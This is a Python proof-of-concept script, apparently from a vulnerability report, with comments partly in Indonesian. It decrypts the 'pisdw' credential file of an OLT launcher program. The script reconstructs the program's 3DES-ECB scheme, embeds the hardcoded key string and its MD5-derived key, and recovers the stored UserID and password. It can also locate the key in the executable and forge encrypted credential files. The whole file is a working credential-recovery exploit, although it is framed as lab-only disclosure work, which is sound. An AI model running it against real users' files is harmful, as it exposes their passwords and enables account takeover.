#!/usr/bin/env python3
"""poc01_decrypt_pisdw.py
OLT Platform - credential storage weakness (report MED-01)
=============================================================
Reconstruction of the OLT launcher crypto (from disassembly):

    clsEncryptionManager.EncryptStringtoFile / DecryptFiletoString
        key  = MD5(Encoding.ASCII.GetBytes("eya!@)&)"))   # hardcoded (dikoreksi, lihat di bawah)
        ciph = TripleDESCryptoServiceProvider
        mode = 2 (CipherMode.ECB)
        IV   = none
        fmt  = base64 text stored in file "pisdw"
        plain= "<UserID>|<Password>"

KOREKSI KUNCI (vs laporan versi awal): byte asli di #US heap offset 0x20ED
adalah karakter 65 79 61 21 40 29 26 29 = "eya!@)&)" (urutan ')','&',')').
Versi awal "eya!@&) " (dengan spasi) SALAH (MD5 6e08cdeb...);
kunci benar = 58b8303f3cd51b2ddc8c9ac0bdced0c6.

This PoC proves that the static 16-byte key inside the (public) binary is
enough to recover UserID|Password from pisdw with no additional secret.

LAB-ONLY: run against a pisdw you are authorized to test. No network use.

Usage:
  python3 poc01_decrypt_pisdw.py <pisdw-file>
  python3 poc01_decrypt_pisdw.py --make <userid> <password> <outfile>
  python3 poc01_decrypt_pisdw.py --self-test
  python3 poc01_decrypt_pisdw.py --extract <OLTLauncher.exe>
Dependencies: none (pure-python DES/3DES).
"""
import sys, hashlib, base64, struct

SECRET = b"eya!@)&)"   # exact bytes from .NET US heap offset 0x20ED (hex 6579612140292629)
                    # confirmed at binary offsets 0x72c876 and 0x72eee8 (UTF-16LE)
                    # NOTE: earlier report had b"eya!@&) " — chars [5-7] were transposed/garbled
CIPHER_KEY = hashlib.md5(SECRET).digest()          # 16 bytes -> 2-key 3DES
                                                    # = 58b8303f3cd51b2ddc8c9ac0bdced0c6

IP = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,
      64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,
      61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7]
FP = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,
      37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,
      34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25]
E  = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,
      20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1]
P  = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,
      30,6,22,11,4,25]
PC1= [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,
      60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,
      29,21,13,5,28,20,12,4]
PC2= [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,
      31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]
SHIFT=[1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]
S = [
[[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],[0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],
 [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],[15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]],
[[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],[3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],
 [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],[13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]],
[[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],[13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],
 [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],[1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]],
[[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],[13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],
 [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],[3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]],
[[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],[14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],
 [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],[11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]],
[[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],[10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],
 [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],[4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13]],
[[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],[13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],
 [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],[6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]],
[[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],[1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],
 [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],[2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]],
]

def str2bits(n, w): return [(n >> (w-1-i)) & 1 for i in range(w)]
def bits2int(b):
    v = 0
    for x in b: v = (v << 1) | x
    return v
def perm(b, t): return [b[i-1] for i in t]
def rotl(b, n): return b[n:] + b[:n]

def subkeys(k8):
    pc1 = perm(str2bits(int.from_bytes(k8, "big"), 64), PC1)
    c, d = pc1[:28], pc1[28:]
    ks = []
    for s in SHIFT:
        c, d = rotl(c, s), rotl(d, s)
        ks.append(bits2int(perm(c + d, PC2)))
    return ks

def f(r, sk):
    x = bits2int(perm(str2bits(r, 32), E)) ^ sk
    o = 0
    for i in range(8):
        c = (x >> (42 - 6*i)) & 0x3f
        o = (o << 4) | S[i][((c >> 4) & 2) | (c & 1)][(c >> 1) & 0xf]
    return bits2int(perm(str2bits(o, 32), P))

def des(b8, sks, decrypt=False):
    v = bits2int(perm(str2bits(int.from_bytes(b8, "big"), 64), IP))
    l, r = v >> 32, v & 0xffffffff
    for sk in (reversed(sks) if decrypt else sks):
        l, r = r, l ^ f(r, sk)
    return bits2int(perm(str2bits((r << 32) | l, 64), FP)).to_bytes(8, "big")

def tdes3_ecb(data, k16, decrypt):
    k1, k2 = subkeys(k16[:8]), subkeys(k16[8:])
    out = b""
    for i in range(0, len(data), 8):
        b = data[i:i+8]
        if decrypt:
            out += des(des(des(b, k1, True), k2), k1, True)
        else:
            out += des(des(des(b, k1), k2, True), k1)
    return out

def pkcs7(b, bs=8):
    p = bs - len(b) % bs
    return b + bytes([p]) * p

def unpad(b):
    p = b[-1]
    if not 1 <= p <= 8 or b[-p:] != bytes([p])*p:
        raise ValueError("bad padding (not ours? check plaintext/scheme)")
    return b[:-p]

def encrypt_plaintext(pt_bytes):
    return base64.b64encode(tdes3_ecb(pkcs7(pt_bytes), CIPHER_KEY, False)).decode("ascii")

def decrypt_pisdw_data(ct_b64):
    if isinstance(ct_b64, bytes):
        ct_b64 = ct_b64.decode("ascii")
    raw = base64.b64decode("".join(ct_b64.split()))
    return tdes3_ecb(raw, CIPHER_KEY, True)

def cmd_extract(exe_path):
    data = open(exe_path, "rb").read()
    pattern = SECRET.decode("ascii").encode("utf-16-le")
    hits = []
    start = 0
    while True:
        i = data.find(pattern, start)
        if i < 0:
            break
        hits.append(i)
        start = i + 1
    print("extract :", exe_path)
    print("kunci literal:", SECRET, "-> md5", CIPHER_KEY.hex())
    if hits:
        print("literal ditemukan (UTF-16LE, terminator tunggal di heap):")
        for h in hits[:6]:
            print("   0x%08x  bytes=%s" % (h, data[h:h+17].hex()))
    else:
        print("TIDAK ditemukan -> SECRET tidak cocok dengan binary ini, kunci SALAH!")
        sys.exit(1)

def cmd_self_test():
    key8 = bytes.fromhex("133457799BBCDFF1")
    pt = bytes.fromhex("0123456789ABCDEF")
    ct = des(pt, subkeys(key8))
    ok = ct.hex().upper() == "85E813540F0AB405"
    print("[DES KAT] %s -> %s  %s" % (pt.hex().upper(), ct.hex().upper(),
                                      "PASS" if ok else "FAIL"))
    if not ok:
        sys.exit(1)
    pin = "58b8303f3cd51b2ddc8c9ac0bdced0c6"
    if CIPHER_KEY.hex() == pin:
        print("MD5(%r) = %s  == jangkar biner (0x20ED)  PASS" % (SECRET, pin))
    else:
        print("MD5(%r) = %s  != jangkar %s  FAIL (kunci salah?)"
              % (SECRET, CIPHER_KEY.hex(), pin))
        sys.exit(1)
    pt = b"OLTDEMO9001|MyP@ssw0rd!"
    ct = encrypt_plaintext(pt)
    back = unpad(decrypt_pisdw_data(ct))
    print("round-trip: %r -> %r  %s" % (pt, back, "PASS" if back == pt else "FAIL"))
    print("duplicate ECB blocks (deterministik, pola bocor):")
    x = b"ABCDABCDABCDABCD"
    c = tdes3_ecb(pkcs7(x), CIPHER_KEY, False)
    print("  blok plaintext identik -> blok ciphertext identik:",
          c[:8] == c[8:16], "(%s...)" % c.hex()[:32])

def cmd_decrypt(path):
    data = open(path, "r", errors="replace").read()
    pt = unpad(decrypt_pisdw_data(data)).decode("ascii", errors="replace")
    print("file      :", path)
    print("key source : hardcoded MD5(%r)" % SECRET)
    print("plaintext :", pt)
    if "|" in pt:
        u, p = pt.split("|", 1)
        print("  -> UserID  =", u)
        print("  -> Password =", p)

def cmd_make(u, p, out):
    pt = (u + "|" + p).encode("ascii")
    ct = encrypt_plaintext(pt)
    open(out, "w").write(ct)
    print("wrote", out, "berisi ciphertext base64; uji decrypt:")
    cmd_decrypt(out)

if __name__ == "__main__":
    if "--self-test" in sys.argv:
        cmd_self_test()
    elif "--extract" in sys.argv:
        cmd_extract(sys.argv[sys.argv.index("--extract") + 1])
    elif "--make" in sys.argv:
        i = sys.argv.index("--make")
        cmd_make(sys.argv[i+1], sys.argv[i+2], sys.argv[i+3])
    else:
        cmd_decrypt(sys.argv[1])